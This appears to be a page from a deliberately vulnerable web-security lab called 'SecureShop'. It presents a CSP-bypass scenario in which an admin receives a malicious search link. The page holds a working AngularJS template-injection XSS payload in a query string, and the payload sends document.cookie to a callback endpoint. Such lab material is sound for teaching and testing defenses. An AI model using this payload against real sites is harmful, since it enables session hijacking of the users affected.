<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Dashboard - SecureShop</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-gradient-to-br from-purple-900 to-indigo-900 text-white min-h-screen">
    <div class="container mx-auto px-6 py-12">
        <div class="max-w-2xl mx-auto">
            <div class="bg-purple-500/30 border border-purple-400 rounded-lg p-4 mb-8">
                <p class="font-semibold">Logged in as Administrator</p>
            </div>

            <div class="bg-white/10 backdrop-blur-md rounded-lg p-8">
                <h2 class="text-2xl font-bold mb-4">CSP Bypass Exploitation Scenario</h2>
                <p class="text-white/80 mb-4">
                    You are the <strong>admin</strong>. An attacker has sent you a malicious search link.
                </p>

                <div class="bg-black/30 rounded-lg p-6 mb-4">
                    <p class="text-sm font-semibold mb-3">Try this payload:</p>
                    <div class="text-xs font-mono bg-black/40 p-3 rounded break-all">
                        <a href="/search?q=<div ng-app ng-csp>{{constructor.constructor('fetch(\"/api/callback?session=\"%2Bdocument.cookie)')()}}</div>"
                           class="text-blue-400">
                            /search?q=&lt;div ng-app ng-csp&gt;{{...}}&lt;/div&gt;
                        </a>
                    </div>
                </div>
            </div>
        </div>
    </div>
</body>
</html>
